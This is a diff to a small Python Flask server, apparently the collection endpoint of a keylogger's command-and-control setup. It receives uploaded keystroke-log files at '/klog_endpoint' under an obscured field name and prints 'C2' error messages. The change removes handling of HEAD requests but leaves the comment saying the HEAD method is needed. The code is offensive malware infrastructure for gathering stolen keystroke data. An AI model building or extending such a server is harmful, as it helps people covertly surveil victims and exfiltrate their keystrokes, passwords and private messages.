@@ -11,7 +11,7 @@ klog_server = Flask(__name__)
 klog_server.config['KLOG_UPLOAD_DIR'] = KLOG_UPLOAD_DIR
 ##klog_server.run(ssl_context=(<name of cert>, <name of pem>))  This line should enable HTTPS for the server
 
-@klog_server.route('/klog_endpoint',methods=['GET','POST','HEAD']) ##This is a place holder endpoint name; HEAD Method needed
+@klog_server.route('/klog_endpoint',methods=['GET','POST']) ##This is a place holder endpoint name; HEAD Method needed
 def klog_collect():
 	if request.method == 'POST':
 		klog_file =  request.files["bbe02f946d5455d74616fc9777557c22"]
@@ -29,6 +29,3 @@ def klog_collect():
 			sys.stdout.write("\n[*]C2 Request Error! Traceback to follow\n")
 			print(sys.exc_info()[2]) ##Contains Error info for running process
 			return "[*]C2 Request Error!"
-		if request.method == 'HEAD':
-                	sys.stdout.write("[*]HEAD request Recived from " + request.remote_addr)
-                	return "HEAD received"
